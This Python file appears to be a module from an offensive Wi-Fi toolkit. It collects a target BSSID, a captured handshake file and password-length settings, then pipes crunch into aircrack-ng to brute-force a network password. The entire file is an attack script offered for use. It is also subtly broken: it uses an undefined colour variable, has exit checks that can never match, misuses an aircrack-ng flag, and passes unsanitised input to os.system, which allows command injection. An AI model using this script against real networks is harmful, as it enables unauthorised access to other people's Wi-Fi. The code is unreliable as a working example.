# wifisploit/modules/brute_force.py

import os

a = '\033[0;31m'
b = '\033[0;32m'
c = '\033[0;37m'
d = '\033[1;37m'

bssid = input(f'{d}wsf ({a}BSSID{d})> {c}')
if bssid.lower() == 'back':
	quit()
else:
	print(f'{d}BSSID => {b}{bssid}')

handshake = input(f'{d}wsf ({a}HandShake{d})> {c}')
if handshake.lower() == 'back':
	quit()
else:
	print(f'{d}HandShake => {b}{handshake}')

channel = int(input(f'{d}wsf ({a}Channel{d})> {c}'))
if channel == 'back':
	quit()
else:
	print(f'{d}Channel => {b}{channel}')

min = int(input(f'{d}wsf ({a}Minimum{d})> {c}'))
if min == 'back':
	quit()
else:
	print(f'{d}Minimum => {b}{min}')

max = int(input(f'{d}wsf ({a}Maximum{d})> {c}'))
if max == 'back':
	quit()
else:
	print(f'{d}Maximum => {b}{max}')

type = input(f'{d}wsf ({a}Type{d})> {C}')
if type.lower() == 'back':
	quit()
else:
	print(f'{d}Type => {b}{type}')

os.system(f'crunch {min} {max} {type} | aircrack-ng -b {bssid} -c {channel} {handshake}')
